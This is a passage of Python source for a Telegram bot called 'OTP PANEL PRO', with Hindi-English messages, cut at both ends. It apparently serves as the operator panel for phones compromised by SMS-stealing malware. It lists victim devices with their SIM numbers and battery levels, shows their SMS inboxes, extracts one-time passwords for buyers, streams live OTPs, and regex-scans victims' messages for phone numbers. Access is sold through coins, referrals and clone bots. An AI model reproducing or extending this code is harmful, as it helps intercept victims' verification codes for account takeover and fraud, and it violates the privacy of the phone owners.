async def send_bonus_if_applicable(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, users_db: dict, is_main_bot: bool):
    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
        users_db[chat_id]["bonus_10_received"] = True
        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
        try:
            await ctx.bot.send_message(
                chat_id, 
                "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf 1 refer (10 coins) aur karo aur khudka OTP bot banao 24 hours ke liye!\n\nClick '💸 Refer & Earn' to get your link.", 
                parse_mode="HTML"
            )
        except: pass

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    user     = update.effective_user
    bot_token = ctx.bot.token
    
    is_main_bot = (bot_token == TOKEN)
    
    if not is_main_bot:
        if bot_token not in CLONES: return
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Aapka premium khatam ho gaya isliye aapka bot off kiya humne.", parse_mode="HTML")
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)

    if users_db.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 You are banned from using this bot.", parse_mode="HTML")
        return

    ref_id = None
    if ctx.args and ctx.args[0].isdigit():
        ref_id = int(ctx.args[0])

    is_new_user = chat_id not in users_db

    if is_new_user:
        users_db[chat_id] = {
            "name":      user.full_name if user else "Unknown",
            "username":  user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified":  False,
            "referrals": 0,
            "referred_users": [],
            "coins":     0,
            "vip_until": 0.0,
            "vip_paused_left": 0.0,
            "penalty_multiplier": 1,
            "private_panels": [],
            "otp_count": 0,
            "bots_created": 0,
            "bonus_10_received": False,
            "global_spam": False,
            "referred_by": ref_id if ref_id != chat_id else None,
            "banned":    False
        }
        
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            users_db[ref_id]["referred_users"].append({"uid": chat_id, "name": user.full_name or "Unknown"})
            users_db[ref_id]["referrals"] = len(users_db[ref_id]["referred_users"])
            users_db[ref_id]["coins"] = users_db[ref_id].get("coins", 0) + 10
            try: await ctx.bot.send_message(ref_id, f"🎉 <b>MUBARAK HO!</b> Aapke referral link se kisi ne join kiya hai. +10 Coins aapke account me add ho gaye hain!", parse_mode="HTML")
            except: pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if not users_db[chat_id].get("verified"):
        await send_join_prompt(update, is_main_bot)
        return

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    text = f"✨ OTP PANEL PRO EDITION ✨\n━━━━━━━━━━━━━━━━━━\nWelcome, {user.first_name}!\nSystem is connected and fully operational.\nUse the menu at the bottom of your screen to navigate."
    await update.message.reply_text(text, reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    await send_bonus_if_applicable(ctx, chat_id, all_users if is_main_bot else CLONES.get(bot_token, {}).get("users", {}), is_main_bot)
    
    if not is_main_bot:
        if bot_token not in CLONES: 
            await query.answer("Bot disabled.", show_alert=True)
            return
        if time.time() > CLONES[bot_token]["expiry"]:
            await query.answer("Premium Expired.", show_alert=True)
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"):
        await query.answer("🚫 You are banned from using this bot.", show_alert=True)
        return

    if is_spamming(chat_id):
        await query.answer("⚠️ Please slow down! Do not spam buttons.", show_alert=True)
        return

    await query.answer()

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "check_join":
            if is_main_bot:
                not_joined = await check_membership(bot_token, ctx.bot, chat_id)
                if not_joined:
                    names = ", ".join(f"@{u}" for u in not_joined)
                    await query.answer(f"❌ Still not joined: {names}\nPlease join first.", show_alert=True)
                    return
            
            users_db.setdefault(chat_id, {})["verified"] = True
            chats_registry.setdefault(bot_token, set()).add(chat_id)
            await query.message.delete()
            await ctx.bot.send_message(chat_id, "✅ Verification successful! Welcome to the bot.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            return

        if data == "cmd_status":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not devices: return
            online  = sum(1 for d in devices if d.status == "online")
            db_counts = {tag: sum(1 for d in devices if d.db_tag == tag) for tag in set(d.db_tag for d in devices)}
            db_lines = "\n".join([f"🗄 DB {tag}: {count} devices" for tag, count in db_counts.items()])
            text = f"📊 BOT STATUS\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n📱 Total Linked: {len(devices)}\n🟢 Online: {online}  |  🔴 Offline: {len(devices) - online}\n"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]])
            await safe_edit(query, text, reply_markup=kb)
            return

        # --- Super Admin Callbacks ---
        if data == "sa_backup" and is_admin:
            await save_data_async()
            await query.answer("✅ Database forcefully backed up!", show_alert=True)
            return
            
        if data == "sa_coins" and is_admin:
            pending_action[chat_id] = {"action": "sa_give_coins"}
            await safe_edit(query, "💰 Give Coins to User\n\nEnter User ID and Amount separated by space.\nExample: 123456789 50\n\n❌ Cancel: /cancel", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
            return
            
        if data == "sa_coins_all" and is_admin:
            pending_action[chat_id] = {"action": "sa_give_coins_all"}
            await safe_edit(query, "🎁 GIVE COINS TO ALL USERS\n━━━━━━━━━━━━━━━━━━\nKitne coins sabhi users ko dena chahte hain? Sirf number likhein (Example: 50):\n\n❌ Cancel: /cancel", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
            return
            
        if data == "sa_broadcast" and is_admin:
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await safe_edit(query, "📢 GLOBAL BROADCAST\n\nType the message you want to broadcast below:\n\n❌ Cancel: /cancel", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
            return

        if data == "admin_spam_broadcast" and is_admin:
            global spam_broadcast_active
            spam_broadcast_active = not spam_broadcast_active
            status = "ON" if spam_broadcast_active else "OFF"
            await query.answer(f"Spam Broadcast is now {status}", show_alert=True)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
            return
            
        # ── DEEP HIDDEN NUMBER SCANNER (ADMIN ONLY) ────────
        if data == "sa_scan_nums" and is_admin:
            await safe_edit(query, "⏳ <b>Scanning devices without numbers...</b>\n\nIsme thoda time lag sakta hai, kripya wait karein...", parse_mode="HTML")
            
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            target_devices = [d for d in devices if not d.numbers]
            
            if not target_devices:
                await safe_edit(query, "✅ Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="close_msg")]]))
                return
                
            results = []
            phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
            
            for d in target_devices[:30]:
                smss = await get_device_sms(d, limit=15)
                found_nums = set()
                sample_sms = ""
                for sms in smss:
                    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                    matches = phone_pattern.findall(body)
                    for m in matches:
                        found_nums.add(m)
                        if not sample_sms:
                            sample_sms = body[:50] + "..."
                
                if found_nums:
                    results.append(f"⚙️ <b>{d.name}</b> (<code>{d.id[:8]}</code>)\n📞 Possible Nums: <b>{', '.join(found_nums)}</b>\n💬 <i>{sample_sms}</i>")
                    
            if not results:
                await safe_edit(query, "📭 Scanning complete. In devices ke messages me koi 10-digit mobile number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                return
                
            text_res = "🔎 <b>DEEP SCAN RESULTS (Hidden Numbers)</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n\n".join(results)
            if len(text_res) > 4000: text_res = text_res[:4000] + "\n\n...[Truncated]"
            
            await safe_edit(query, text_res, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return

        # ── ADMIN PANEL callbacks ─────────────────────────
        if data == "admin_refresh" and is_admin:
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
            return
            
        if data == "add_custom_db" and not is_main_bot and is_admin:
            pending_action[chat_id] = {"action": "add_custom_db", "clone_token": bot_token}
            await safe_edit(query, "🔗 ADD CUSTOM FIREBASE\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein:\n(Example: https://your-panel-default-rtdb.firebaseio.com)\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            return

        if data == "admin_users" and is_admin:
            if not users_db:
                await query.answer("No users found.", show_alert=True)
                return
            lines = ["👥 User List (Top 50)\n━━━━━━━━━━━━━━━━━━\n"]
            for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
                icon = "🚫" if info.get("banned") else ("✅" if info.get("verified") else "⏳")
                lines.append(f"{i}. {icon} {user_display(info)}\n   ID: {uid} | OTPs: {info.get('otp_count',0)}")
            text = "\n".join(lines)
            if len(text) > 4000: text = text[:4000] + "\n\n...[more users]"
            text += "\n\nTip: To ban someone type /ban ID"
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
            return

        # ── VIP PAUSE / RESUME ─────────────────────────────
        if data == "vip_pause":
            vip_until = users_db.get(chat_id, {}).get("vip_until", 0.0)
            if vip_until > time.time():
                users_db[chat_id]["vip_paused_left"] = vip_until - time.time()
                users_db[chat_id]["vip_until"] = 0.0
                await query.answer("⏸ VIP Paused Successfully!", show_alert=True)
                await safe_edit(query, get_profile_text(chat_id, users_db, is_main_bot), reply_markup=get_profile_keyboard(chat_id, users_db))
            return

        if data == "vip_resume":
            paused_left = users_db.get(chat_id, {}).get("vip_paused_left", 0.0)
            if paused_left > 0:
                users_db[chat_id]["vip_until"] = time.time() + paused_left
                users_db[chat_id]["vip_paused_left"] = 0.0
                await query.answer("▶️ VIP Resumed Successfully!", show_alert=True)
                await safe_edit(query, get_profile_text(chat_id, users_db, is_main_bot), reply_markup=get_profile_keyboard(chat_id, users_db))
            return
            
        if data == "refresh_profile":
            await safe_edit(query, get_profile_text(chat_id, users_db, is_main_bot), reply_markup=get_profile_keyboard(chat_id, users_db))
            return

        # ── HOME & RECENT ─────────────────────────────
        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            if not is_vip(bot_token, chat_id):
                multiplier = users_db.get(chat_id, {}).get("penalty_multiplier", 1)
                cost = 50 * multiplier
                if is_main_bot: await safe_edit(query, f"🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. 24 ghante ke access ke liye {cost} Coins chahiye. Niche diye gaye button se apna referral link share karein aur doston ko invite karke coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id))
                else: await safe_edit(query, "🚫 Aapka premium access nahi hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                return
                
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
                    
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return
            
        if data == "recent_menu":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            text_msg = "📬 RECENT SMS CATEGORIES\n━━━━━━━━━━━━━━━━━━\nAapko kab ke active numbers dekhne hain? Niche select karein:"
            await safe_edit(query, text_msg, reply_markup=get_recent_category_keyboard())
            return
            
        if data.startswith("rcat:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            
            cat = data.split(":")[1] 
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
            
            headers = {
                "today": "📅 TODAY'S ACTIVE NUMBERS (Last 24 Hours)",
                "yesterday": "📆 YESTERDAY'S NUMBERS (24h - 48h Ago)",
                "all": "🔥 ALL RECENT NUMBERS"
            }
            
            text_msg = f"{headers.get(cat, 'NUMBERS')}\n━━━━━━━━━━━━━━━━━━\nKisi bhi number par click karein aur uske andar ka INBOX check karein:"
            await safe_edit(query, text_msg, reply_markup=get_categorized_recent_keyboard(devices, cat))
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            page = int(data[3:])
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
            await safe_edit(query, f"🟢 ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("cp:"):
            await query.answer(f"✅ OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[4:]
            
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
                    
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label, status = device_label(device), "🟢 Online" if device.status == "online" else "🔴 Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"📱 CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\n⚠️ You are now receiving LIVE OTPs for this number. Click 'Disconnect' to stop."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
            return

        if data.startswith("msgs:") or data.startswith("r_msgs:"):
            if not is_vip(bot_token, chat_id): return
            is_recent = data.startswith("r_msgs:")
            dev_id = data[7:] if is_recent else data[5:]
            
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
            
            device = next((d for d in devices if d.id == dev_id), None)
            
            if not device:
                await query.answer("❌ Device not found in active list!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss  = await get_device_sms(device)
            
            back_btn = InlineKeyboardButton("🔙 Back to Categories", callback_data="recent_menu") if is_recent else InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel:{dev_id}")
            
            if not smss:
                await safe_edit(query, f"📭 {label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[back_btn]]))
                return
                
            header = f"📩 ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            otp_buttons.append([back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
            return

        if data.startswith("info:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[5:]
            
            devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
            if is_main_bot:
                for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                    devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
                    
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label, status = device_label(device), "🟢 Online" if device.status == "online" else "🔴 Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"ℹ️ DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : <code>{num}</code>\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("🔙 Disconnect & Back",  callback_data="home")],
            ])
            await safe_edit(query, text, reply_markup=kb)
            return

    except Exception as e:
        tlog(f"❌ Callback error [{data}]: {e}")
        try: await query.answer("⚠️ An error occurred, please try again.", show_alert=True)
        except: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES: return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if not is_main_bot:
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Aapka 24 hours ka plan end huva.\nIse phir se start karne ke liye apne main bot mein jayen aur 'Create Your Bot' use karein.", parse_mode="HTML")
            return

    if users_db.get(chat_id, {}).get("banned"): return
    if await check_penalty_routine(ctx.bot, chat_id, users_db): return

    if is_admin and text.startswith("/ban "):
        try:
            target_id = int(text.split(" ")[1])
            if target_id in users_db:
                users_db[target_id]["banned"] = True
                user_focus.setdefault(bot_token, {}).pop(target_id, None)
                await update.message.reply_text(f"✅ User {target_id} successfully banned.", parse_mode="HTML")
            else: await update.message.reply_text("❌ User ID not found in database.")
        except: pass
        return
        
    if is_admin and text.startswith("/unban "):
        try:
            target_id = int(text.split(" ")[1])
            if target_id in users_db:
                users_db[target_id]["banned"] = False
                await update.message.reply_text(f"✅ User {target_id} successfully unbanned.", parse_mode="HTML")
            else: await update.message.reply_text("❌ User ID not found in database.")
        except: pass
        return

    if is_spamming(chat_id): return

    # Global Spam Feature (VIP Only)
    if text.startswith("🔥 Global Spam"):
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            multiplier = users_db.get(chat_id, {}).get("penalty_multiplier", 1)
            cost = 50 * multiplier
            await update.message.reply_text(f"🚫 Premium Feature!\n\nIs feature ko use karne ke liye aapke paas VIP access hona chahiye. ({cost} coins for 24 Hours!)", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else None, parse_mode="HTML")
            return
            
        current_state = users_db.get(chat_id, {}).get("global_spam", False)
        users_db[chat_id]["global_spam"] = not current_state
        new_state = "ON" if not current_state else "OFF"
        await update.message.reply_text(f"✅ Global Spam Mode is now {new_state}!\n\nAb aapko sabhi incoming SMS aur OTPs bina number select kiye direct aayenge.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")
        return

    # Super Admin Menu
    if text == "⚡ Super Admin" and is_admin:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔎 Scan Hidden Numbers", callback_data="sa_scan_nums")],
            [InlineKeyboardButton("💾 Force Backup DB", callback_data="sa_backup")],
            [InlineKeyboardButton("💰 Give Coins to UID", callback_data="sa_coins"), InlineKeyboardButton("🎁 Give to ALL", callback_data="sa_coins_all")],
            [InlineKeyboardButton("📢 Global App Broadcast", callback_data="sa_broadcast")],
            [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
        ])
        await update.message.reply_text("⚡ SUPER ADMIN MENU ⚡\nChoose an advanced option:", reply_markup=kb, parse_mode="HTML")
        return

    if text == "📱 Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            multiplier = users_db.get(chat_id, {}).get("penalty_multiplier", 1)
            cost = 50 * multiplier
            if is_main_bot: await update.message.reply_text(f"🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. Niche diye gaye button se apna referral link share karein aur doston ko invite karke {cost} coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")
            else: await update.message.reply_text("🚫 Aapka premium access nahi hai.", parse_mode="HTML")
            return
            
        devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
        if is_main_bot:
            for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
                
        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
        return

    if text == "🔍 Search Number":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            multiplier = users_db.get(chat_id, {}).get("penalty_multiplier", 1)
            cost = 50 * multiplier
            if is_main_bot: await update.message.reply_text(f"🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. Niche diye gaye button se apna referral link share karein aur doston ko invite karke {cost} coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")
            return
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("🔍 SEARCH NUMBER\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below:\n\n❌ Cancel: /cancel", parse_mode="HTML")
        return

    if text == "📊 Bot Status" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        online  = sum(1 for d in devices if d.status == "online")
        db_counts = {tag: sum(1 for d in devices if d.db_tag == tag) for tag in set(d.db_tag for d in devices)}
        db_lines = "\n".join([f"🗄 DB {tag}: {count} devices" for tag, count in db_counts.items()])
        status_text = f"📊 BOT STATUS\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n📱 Total Linked: {len(devices)}\n🟢 Online: {online}  |  🔴 Offline: {len(devices) - online}\n"
        await update.message.reply_text(status_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        return

    if text == "📬 Recent SMS Numbers":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            multiplier = users_db.get(chat_id, {}).get("penalty_multiplier", 1)
            cost = 50 * multiplier
            if is_main_bot: await update.message.reply_text(f"🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. Niche diye gaye button se apna referral link share karein aur doston ko invite karke {cost} coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")
            return
        
        text_msg = "📬 RECENT SMS CATEGORIES\n━━━━━━━━━━━━━━━━━━\nAapko kab ke active numbers dekhne hain? Niche select karein:"
        await update.message.reply_text(text_msg, reply_markup=get_recent_category_keyboard(), parse_mode="HTML")
        return

    if text.startswith("🤖 Create Your Bot") and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        bots_created = users_db.get(chat_id, {}).get("bot_creation_count", 0)
        req_coins = 50 + (bots_created * 10)
        user_coins = all_users.get(chat_id, {}).get("coins", 0)
        
        if user_coins >= req_coins or is_admin:
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req_coins}
            await update.message.reply_text(f"🤖 CREATE / RENEW CLONE BOT\n━━━━━━━━━━━━━━━━━━\nAapka current plan cost hai: <b>{req_coins} Coins</b> (24 hours ke liye).\n\nPehle @BotFather pe jaake naya bot banayein, aur uska HTTP API Token yahan bhejein.\n\n❌ Cancel: /cancel", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Not Enough Coins\n━━━━━━━━━━━━━━━━━━\nAapke paas {user_coins} Coins hain. Bot banane/renew karne ke liye <b>{req_coins} Coins</b> chahiye.\nApne doston ko refer karke aur coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")
        return

    if text == "➕ Add Private Panel" and is_main_bot:
        if not is_vip(bot_token, chat_id):
            await update.message.reply_text("🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nPrivate Panels add karne ke liye VIP hona zaroori hai.", parse_mode="HTML")
            return
        pending_action[chat_id] = {"action": "add_private_panel"}
        await update.message.reply_text("➕ ADD PRIVATE PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein. Ye panel aur iske numbers sirf AAPKO dikhenge.\n\n❌ Cancel: /cancel", parse_mode="HTML")
        return

    if text == "👑 Buy VIP Access" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        user_coins = all_users.get(chat_id, {}).get("coins", 0)
        multiplier = all_users.get(chat_id, {}).get("penalty_multiplier", 1)
        cost = 50 * multiplier
        
        if user_coins >= cost or is_admin:
            if not is_admin: all_users[chat_id]["coins"] -= cost
            current_vip = all_users[chat_id].get("vip_until", 0.0)
            all_users[chat_id]["vip_until"] = max(time.time(), current_vip) + (24 * 3600)
            all_users[chat_id]["vip_paused_left"] = 0.0
            await update.message.reply_text(f"✅ VIP Purchased Successfully!\n━━━━━━━━━━━━━━━━━━\n{cost} Coins deducted.\nAapke paas ab agle 24 ghante tak full bot access hai.\nEnjoy!", reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Not Enough Coins\n━━━━━━━━━━━━━━━━━━\nAapke paas {user_coins} Coins hain. VIP ke liye {cost} Coins chahiye.\nApne doston ko refer karke aur coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")
        return

    if text == "🏆 Leaderboard":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        sorted_users = sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)
        top_10 = sorted_users[:10]
        lb_text = "🏆 GLOBAL LEADERBOARD (Top 10)\n━━━━━━━━━━━━━━━━━━\n"
        for i, (uid, info) in enumerate(top_10, 1): lb_text += f"{i}. {info.get('name', 'Unknown')} — {info.get('otp_count', 0)} OTPs\n"
        lb_text += "━━━━━━━━━━━━━━━━━━\nSabse zyada OTPs use karne wale users ki list."
        await update.message.reply_text(lb_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        return

    if text == "💸 Refer & Earn" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        multiplier = all_users.get(chat_id, {}).get("penalty_multiplier", 1)
        cost = 50 * multiplier
        
